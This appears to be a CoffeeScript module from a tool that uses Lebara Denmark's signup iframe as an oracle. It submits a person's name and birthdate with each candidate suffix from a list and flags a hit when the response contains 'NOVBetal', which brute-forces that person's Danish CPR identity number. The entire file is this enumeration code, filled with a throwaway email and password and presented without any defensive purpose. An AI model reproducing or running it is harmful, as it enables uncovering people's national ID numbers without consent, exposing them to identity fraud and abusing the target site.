Recipe = require("../Recipe.js")
Curl = require("../utils/Curl.js")
$ = require("jquery")
querystring = require("querystring")

class @Lebara extends Recipe.Recipe

	# constructor
	constructor: (inputData, socket) ->

		@counter = 0
		@inputData = inputData
		@socket = socket
		@domTarget = ""

		@req =
			data:
				cprok: "on"
				email: "test@ofir.dk"
				password1: "test1234"
				password2: "test1234"
				navn: inputData["firstName"] + " " + inputData["lastName"]
				cpr: inputData["dob"]+"-"+inputData["cprList"][0]

			options:
				url: "https://mypage.lebara.dk/iframe/NOVcpr_iframe.asp"
				#url: "http://dummyrep.konscript.net/testNumberBig.php"
				method: "POST"
				encoding: "UTF-8"

	updateCPR: ->
		@req.data.cpr = @inputData["dob"]+"-"+@inputData["cprList"][@counter]

	getResponse: (req, res, err, callback) ->
		
		html = res.body
		cpr = querystring.parse(req.data).cpr
		
		if html.indexOf("NOVBetal") > -1
		  callback cpr, "success", html
		else
		  callback cpr, "error", html